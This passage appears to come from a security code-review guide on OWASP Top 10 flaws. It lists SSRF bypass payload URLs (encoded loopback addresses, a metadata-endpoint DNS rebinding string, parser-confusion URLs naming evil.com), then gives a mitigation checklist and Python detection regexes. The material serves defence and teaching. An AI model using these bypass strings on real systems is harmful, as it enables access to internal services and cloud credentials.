```

**SSRF bypass techniques**:
```text
http://127.0.0.1:80
http://localhost:8080
http://[::1]:22
http://0.0.0.0:3306
http://0:80
http://2130706433:8080  (127.0.0.1 as decimal)
http://0x7f000001:80     (127.0.0.1 as hex)
http://0177.0.0.1:80     (127.0.0.1 as octal)
http://127.1:80           (short form)
http://⑯⑨。②⑤④。⑯⑨。②⑤④  (Unicode bypass)
http://169.254.169.254.xip.io:80  (DNS rebinding)
http://1.1.1.1 &@2.2.2.2          (URL parser confusion)
http://evil.com#@169.254.169.254   (Fragment confusion)
```

#### 10.4 SSRF Mitigation Checklist

| Technique | Implementation |
|---|---|
| Allowlist domains | Only permit specific outbound domains |
| Denylist internal IPs | Block RFC 1918, loopback, link-local |
| DNS rebinding protection | Re-resolve IP after DNS lookup |
| Disable redirects | `allow_redirects=False` |
| URL scheme allowlist | Only allow `http://` / `https://` |
| Timeout | Set request timeout < 10s |
| No raw response | Strip or sanitize response before returning |

---

## LANGUAGE-SPECIFIC DETECTION REGEX

```python
# OWASP Top 10 detection patterns by vulnerability

OWASP_A01_ACCESS_CONTROL = {
    "missing_auth_decorator": r"@app\.route\(.*methods=\[.*(?:POST|PUT|DELETE|PATCH)",
    "no_auth_on_idor": r"/(?:user|account|order|invoice|document|file)/(?:<id>|<pk>|:\w+)/?(?:$|[\"'\s])",
    "cors_wildcard_credentials": r"Access-Control-Allow-Origin:\s*\*.*Access-Control-Allow-Credentials:\s*true",
}

OWASP_A02_CRYPTO = {
    "md5_hash": r"(?i)\bmd5\s*\(",
    "sha1_hash": r"(?i)\bsha1?\s*\(",
    "des_encryption": r"(?i)DES\.new\(|DES3\.new\(|RC4\.new\(|Blowfish\.new\(",
    "ecb_mode": r"(?i)MODE_ECB|AES\.new\(.*ECB",
    "weak_rsa": r"RSA\.generate\(1024\)",
    "random_not_secrets": r"^import random$",
    "verify_false": r"verify\s*=\s*False|verify\s*:\s*false",
    "weak_tls": r"PROTOCOL_TLSv1[^3]|ssl\.wrap_socket|OP_NO_SSLv[^2]",
}

OWASP_A03_INJECTION = {
    "sql_concat": r"(\"|').*(SELECT|INSERT|UPDATE|DELETE).*(\"|')\s*\+",
    "sql_fstring": r'f["\'].*(SELECT|INSERT|UPDATE|DELETE).*\{.*\}',
    "sql_format": r'["\'].*(SELECT|INSERT|UPDATE|DELETE).*["\'].*\.format\(',
    "os_system": r"os\.system\(\s*[f\"']",
    "subprocess_shell": r"subprocess\.(call|Popen|run)\(.*shell\s*=\s*True",
    "eval_call": r"\beval\s*\(",
    "exec_call": r"\bexec\s*\(",
    "render_template_string": r"render_template_string\(.*input|request|get|post",
    "template_from_string": r"from_string\(.*input|request|get|post",
}

OWASP_A05_MISCONFIG = {
    "debug_true": r"DEBUG\s*=\s*True|app\.run\(.*debug\s*=\s*True",
    "secret_hardcoded": r"SECRET_KEY\s*=\s*[\"'][^\"']{5,}[\"']",
    "cors_allow_all": r"allow_origins\s*=\s*\[\"\*\"\]|Access-Control-Allow-Origin:\s*\*",
}

OWASP_A07_AUTH = {
    "jwt_none_alg": r"jwt\.decode\(.*algorithms=\[\"none\"\]",
    "jwt_no_verify": r"jwt\.decode\(.*verify=False",
    "no_session_regenerate": r"session\[",
    "hardcoded_password": r"password\s*=\s*[\"'][^\"']{3,}[\"']",
}

OWASP_A08_INTEGRITY = {
    "pickle_loads": r"pickle\.loads\(",
    "yaml_load": r"yaml\.load\(",
    "shelve_open": r"shelve\.open\(",
    "binary_formatter": r"BinaryFormatter\.Deserialize",
    "object_input_stream": r"ObjectInputStream\.readObject",
    "unserialize_php": r"unserialize\s*\(",
    "marshal_load": r"Marshal\.load\(",
}

OWASP_A10_SSRF = {
    "user_url_request": r"requests\.(get|post|put)\(.*(?:request\.(?:get|post)|input\(|args\.get)",
    "user_url_fetch": r"fetch\(.*(?:req\.|input|params)",
    "user_url_httpclient": r"HttpClient\.Get(?:Async)?\(.*(?:user|input|param)",
    "curl_user_input": r"curl_exec\(.*\$",
}
```
